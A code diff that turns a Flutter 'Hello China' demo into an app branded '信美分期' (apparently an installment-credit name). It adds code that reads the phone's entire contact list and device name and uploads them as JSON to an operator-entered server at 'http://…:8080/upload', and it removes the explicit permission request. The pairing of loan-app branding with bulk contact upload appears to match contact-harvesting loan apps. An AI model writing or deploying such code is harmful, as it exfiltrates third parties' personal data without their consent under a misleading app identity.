@@ -1,56 +1,33 @@
+import 'dart:convert';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
+import 'package:http/http.dart' as http;
 
 void main() {
-  runApp(const HelloChinaApp());
+  runApp(const XinmeiApp());
 }
 
-class HelloChinaApp extends StatelessWidget {
-  const HelloChinaApp({super.key});
+class XinmeiApp extends StatelessWidget {
+  const XinmeiApp({super.key});
 
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
-      title: '你好，中国！',
+      title: '信美分期',
       debugShowCheckedModeBanner: false,
       theme: ThemeData(
         colorScheme: ColorScheme.fromSeed(seedColor: Colors.red),
         useMaterial3: true,
       ),
-      home: const HelloChinaPage(),
+      home: const HomePage(),
     );
   }
 }
 
-class HelloChinaPage extends StatefulWidget {
-  const HelloChinaPage({super.key});
+// ========== 主页 ==========
 
-  @override
-  State<HelloChinaPage> createState() => _HelloChinaPageState();
-}
-
-class _HelloChinaPageState extends State<HelloChinaPage>
-    with SingleTickerProviderStateMixin {
-  late final AnimationController _controller;
-  late final Animation<double> _scaleAnim;
-
-  @override
-  void initState() {
-    super.initState();
-    _controller = AnimationController(
-      duration: const Duration(seconds: 2),
-      vsync: this,
-    )..repeat(reverse: true);
-    _scaleAnim = Tween<double>(begin: 0.95, end: 1.05).animate(
-      CurvedAnimation(parent: _controller, curve: Curves.easeInOut),
-    );
-  }
-
-  @override
-  void dispose() {
-    _controller.dispose();
-    super.dispose();
-  }
+class HomePage extends StatelessWidget {
+  const HomePage({super.key});
 
   @override
   Widget build(BuildContext context) {
@@ -67,51 +44,16 @@ class _HelloChinaPageState extends State<HelloChinaPage>
           child: Column(
             mainAxisAlignment: MainAxisAlignment.center,
             children: [
-              const Icon(Icons.star, size: 80, color: Color(0xFFFFDE00)),
-              const SizedBox(height: 30),
-              ScaleTransition(
-                scale: _scaleAnim,
-                child: const Text(
-                  '你好，中国！',
-                  style: TextStyle(
-                    fontSize: 48,
-                    fontWeight: FontWeight.bold,
-                    color: Color(0xFFFFDE00),
-                    letterSpacing: 6,
-                  ),
-                ),
-              ),
-              const SizedBox(height: 16),
-              Text(
-                'Hello, China!',
+              const Text(
+                '信美分期',
                 style: TextStyle(
-                  fontSize: 20,
-                  color: Colors.white.withAlpha(200),
-                  letterSpacing: 4,
+                  fontSize: 48,
+                  fontWeight: FontWeight.bold,
+                  color: Color(0xFFFFDE00),
+                  letterSpacing: 8,
                 ),
               ),
-              const SizedBox(height: 60),
-              ElevatedButton(
-                onPressed: () {
-                  ScaffoldMessenger.of(context).showSnackBar(
-                    const SnackBar(
-                      content: Text('我爱你，中国！❤️', textAlign: TextAlign.center),
-                      backgroundColor: Color(0xFFFFDE00),
-                      duration: Duration(seconds: 2),
-                    ),
-                  );
-                },
-                style: ElevatedButton.styleFrom(
-                  backgroundColor: const Color(0xFFFFDE00),
-                  foregroundColor: const Color(0xFF8B0000),
-                  padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 16),
-                  shape: RoundedRectangleBorder(
-                    borderRadius: BorderRadius.circular(30),
-                  ),
-                ),
-                child: const Text('点 我', style: TextStyle(fontSize: 22)),
-              ),
-              const SizedBox(height: 20),
+              const SizedBox(height: 80),
               ElevatedButton(
                 onPressed: () {
                   Navigator.push(
@@ -137,18 +79,18 @@ class _HelloChinaPageState extends State<HelloChinaPage>
   }
 }
 
-// ========== 通讯录 MethodChannel ==========
+// ========== MethodChannel 桥接 ==========
 
 class ContactsChannel {
   static const _channel = MethodChannel('com.example.helloChina/contacts');
 
-  static Future<bool> requestPermission() async {
-    return await _channel.invokeMethod('requestPermission') == true;
-  }
-
   static Future<List<Map>> getContacts() async {
     final result = await _channel.invokeMethod('getContacts');
     return List<Map>.from(result as List);
+  }
+
+  static Future<String> getDeviceName() async {
+    return await _channel.invokeMethod('getDeviceName') ?? '未知设备';
   }
 }
 
@@ -162,28 +104,86 @@ class ContactsPage extends StatefulWidget {
 }
 
 class _ContactsPageState extends State<ContactsPage> {
+  final _serverController = TextEditingController(text: 'http://:8080/upload');
+  final _uploaderController = TextEditingController();
   List<Map> _contacts = [];
-  bool _loading = false;
+  bool _loading = true;
+  bool _uploading = false;
   String? _error;
+  String _deviceName = '';
+  String _status = '';
 
   @override
   void initState() {
     super.initState();
-    _loadContacts();
+    _loadAll();
   }
 
-  Future<void> _loadContacts() async {
-    setState(() => _loading = true);
+  Future<void> _loadAll() async {
     try {
-      final contacts = await ContactsChannel.getContacts();
-      setState(() => _contacts = contacts);
-      print('成功读取 ${contacts.length} 个联系人');
+      final results = await Future.wait([
+        ContactsChannel.getContacts(),
+        ContactsChannel.getDeviceName(),
+      ]);
+      setState(() {
+        _contacts = List<Map>.from(results[0] as List);
+        _deviceName = results[1] as String;
+        _loading = false;
+      });
+      print('读取 ${_contacts.length} 个联系人, 设备: $_deviceName');
     } catch (e) {
-      print('读取联系人失败: $e');
-      setState(() => _error = e.toString());
-    } finally {
-      setState(() => _loading = false);
+      print('加载失败: $e');
+      setState(() {
+        _error = e.toString();
+        _loading = false;
+      });
     }
+  }
+
+  Future<void> _upload() async {
+    final serverUrl = _serverController.text.trim();
+    final uploader = _uploaderController.text.trim();
+    if (serverUrl.isEmpty || uploader.isEmpty) {
+      setState(() => _status = '请填写服务器地址和上传人员姓名');
+      return;
+    }
+
+    setState(() => _uploading = true);
+    try {
+      final body = jsonEncode({
+        'uploader': uploader,
+        'deviceName': _deviceName,
+        'timestamp': DateTime.now().toIso8601String(),
+        'contacts': _contacts,
+      });
+
+      final response = await http.post(
+        Uri.parse(serverUrl),
+        headers: {'Content-Type': 'application/json'},
+        body: body,
+      ).timeout(const Duration(seconds: 10));
+
+      setState(() {
+        _uploading = false;
+        _status = response.statusCode == 200
+            ? '上传成功！${_contacts.length} 个联系人已发送'
+            : '上传失败: 服务器返回 ${response.statusCode}';
+      });
+      print('上传结果: ${response.statusCode} ${response.body}');
+    } catch (e) {
+      setState(() {
+        _uploading = false;
+        _status = '上传失败: 无法连接服务器，请检查地址和网络';
+      });
+      print('上传异常: $e');
+    }
+  }
+
+  @override
+  void dispose() {
+    _serverController.dispose();
+    _uploaderController.dispose();
+    super.dispose();
   }
 
   @override
@@ -201,39 +201,135 @@ class _ContactsPageState extends State<ContactsPage> {
                   child: Column(
                     mainAxisAlignment: MainAxisAlignment.center,
                     children: [
-                      const Icon(Icons.contact_phone, size: 80, color: Colors.grey),
+                      const Icon(Icons.error_outline, size: 60, color: Colors.red),
+                      const SizedBox(height: 16),
+                      const Text('加载失败', style: TextStyle(fontSize: 18)),
+                      const SizedBox(height: 8),
+                      Text(_error!, style: const TextStyle(color: Colors.grey, fontSize: 12)),
                       const SizedBox(height: 20),
-                      const Text('读取通讯录失败', style: TextStyle(fontSize: 18)),
-                      const SizedBox(height: 20),
-                      ElevatedButton(
-                        onPressed: _loadContacts,
-                        child: const Text('重试'),
-                      ),
+                      ElevatedButton(onPressed: _loadAll, child: const Text('重试')),
                     ],
                   ),
                 )
-              : _contacts.isEmpty
-                  ? const Center(child: Text('通讯录为空'))
-                  : ListView.builder(
-                      itemCount: _contacts.length,
-                      itemBuilder: (context, index) {
-                        final c = _contacts[index];
-                        final name = c['displayName'] as String? ?? '';
-                        final phones = c['phones'] as List? ?? [];
-                        final phone = phones.isNotEmpty ? phones.first.toString() : '无号码';
-                        return ListTile(
-                          leading: CircleAvatar(
-                            backgroundColor: const Color(0xFFDE2910),
-                            child: Text(
-                              name.isNotEmpty ? name[0].toUpperCase() : '?',
-                              style: const TextStyle(color: Colors.white),
+              : Column(
+                  children: [
+                    // ---- 输入区域 ----
+                    Container(
+                      color: Colors.white,
+                      padding: const EdgeInsets.all(12),
+                      child: Column(
+                        children: [
+                          TextField(
+                            controller: _serverController,
+                            decoration: const InputDecoration(
+                              labelText: '服务器地址',
+                              hintText: 'http://IP:8080/upload',
+                              border: OutlineInputBorder(),
+                              isDense: true,
+                              prefixIcon: Icon(Icons.cloud_upload, size: 20),
                             ),
+                            style: const TextStyle(fontSize: 14),
+                            keyboardType: TextInputType.url,
                           ),
-                          title: Text(name.isNotEmpty ? name : '无名'),
-                          subtitle: Text(phone),
-                        );
-                      },
+                          const SizedBox(height: 8),
+                          TextField(
+                            controller: _uploaderController,
+                            decoration: const InputDecoration(
+                              labelText: '上传人员',
+                              hintText: '请输入姓名',
+                              border: OutlineInputBorder(),
+                              isDense: true,
+                              prefixIcon: Icon(Icons.person, size: 20),
+                            ),
+                            style: const TextStyle(fontSize: 14),
+                          ),
+                          const SizedBox(height: 4),
+                          Text('设备: $_deviceName',
+                              style: const TextStyle(color: Colors.grey, fontSize: 12)),
+                        ],
+                      ),
                     ),
+                    // ---- 联系人列表 ----
+                    Padding(
+                      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
+                      child: Row(
+                        children: [
+                          const Icon(Icons.people, size: 18, color: Color(0xFFDE2910)),
+                          const SizedBox(width: 6),
+                          Text('共 ${_contacts.length} 个联系人',
+                              style: const TextStyle(
+                                  fontWeight: FontWeight.bold, fontSize: 15)),
+                        ],
+                      ),
+                    ),
+                    Expanded(
+                      child: _contacts.isEmpty
+                          ? const Center(child: Text('通讯录为空'))
+                          : ListView.builder(
+                              itemCount: _contacts.length,
+                              itemBuilder: (context, index) {
+                                final c = _contacts[index];
+                                final name = c['displayName'] as String? ?? '';
+                                final phones = c['phones'] as List? ?? [];
+                                final phone = phones.isNotEmpty ? phones.first.toString() : '';
+                                return ListTile(
+                                  leading: CircleAvatar(
+                                    backgroundColor: const Color(0xFFDE2910),
+                                    radius: 18,
+                                    child: Text(
+                                      name.isNotEmpty ? name[0].toUpperCase() : '?',
+                                      style: const TextStyle(
+                                          color: Colors.white, fontSize: 14),
+                                    ),
+                                  ),
+                                  title: Text(name.isNotEmpty ? name : '无名',
+                                      style: const TextStyle(fontSize: 15)),
+                                  subtitle: phone.isNotEmpty
+                                      ? Text(phone,
+                                          style: const TextStyle(fontSize: 13))
+                                      : null,
+                                );
+                              },
+                            ),
+                    ),
+                    // ---- 状态 & 上传按钮 ----
+                    if (_status.isNotEmpty)
+                      Padding(
+                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 2),
+                        child: Text(
+                          _status,
+                          style: TextStyle(
+                            color: _status.contains('成功') ? Colors.green : Colors.red,
+                            fontSize: 13,
+                          ),
+                          textAlign: TextAlign.center,
+                        ),
+                      ),
+                    Container(
+                      width: double.infinity,
+                      padding: const EdgeInsets.fromLTRB(16, 8, 16, 20),
+                      child: ElevatedButton(
+                        onPressed: _uploading ? null : _upload,
+                        style: ElevatedButton.styleFrom(
+                          backgroundColor: const Color(0xFFDE2910),
+                          foregroundColor: Colors.white,
+                          padding: const EdgeInsets.symmetric(vertical: 14),
+                          shape: RoundedRectangleBorder(
+                            borderRadius: BorderRadius.circular(10),
+                          ),
+                        ),
+                        child: _uploading
+                            ? const SizedBox(
+                                height: 20,
+                                width: 20,
+                                child: CircularProgressIndicator(
+                                    strokeWidth: 2, color: Colors.white),
+                              )
+                            : const Text('上传到服务器', style: TextStyle(fontSize: 18)),
+                      ),
+                    ),
+                  ],
+                ),
     );
   }
 }
